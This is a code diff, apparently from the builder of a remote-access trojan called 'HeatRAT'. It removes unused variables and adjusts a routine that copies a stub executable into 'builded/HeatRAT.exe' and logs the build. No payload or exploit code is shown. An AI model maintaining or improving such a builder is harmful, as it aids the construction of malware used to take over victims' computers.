@@ -26,12 +26,6 @@ void fileCopy(string path, string destination)
 	hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
 	FlushConsoleInputBuffer(hConsole);
 	int col = 9;
-	bool logoShow = true;
-	string space = "          ";
-	string command = "";
-	string line = "";
-	string something = "";
-	string curentUSER = "";
 	ifstream firstFile(path.c_str(), ios::binary);
 	if (firstFile)
 	{
@@ -104,12 +98,7 @@ void Build()
 	hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
 	FlushConsoleInputBuffer(hConsole);
 	int col = 9;
-	bool logoShow = true;
-	string space = "          ";
-	string command = "";
-	string line = "";
 	string something = "";
-	string curentUSER = "";
 	string ports = "Modules\\Preferences\\ports.txt";
 	bool openPort = false;
 	char stub[] = "Modules/stub/Stub.exe";
@@ -132,6 +121,7 @@ void Build()
 	ifstream file(ports);
 	if (file.is_open())
 	{
+		string line;
 		while (getline(file, line))
 		{
 			if (line == something)
@@ -150,7 +140,6 @@ void Build()
 		SetConsoleTextAttribute(hConsole, col);
 	}
 	file.close();
-	line = "";
 	if (openPort)
 	{
 		col = 8;
@@ -190,10 +179,10 @@ void Build()
 			Sleep(100);
 		}
 		printf("]\n\n");
-		fileCopy("Modules/stub/Stub.exe", "builded/HeatRAT.exe");
+
+		fileCopy("Modules/stub/Stub.exe", "builded/HeatRAT.exe");//fix here
 		string version = "3.0.3";
 		string log = "builded\\log.txt";
-
 		srand(time(0));
 		ofstream file(log, ios::app);
 		if (file.is_open())
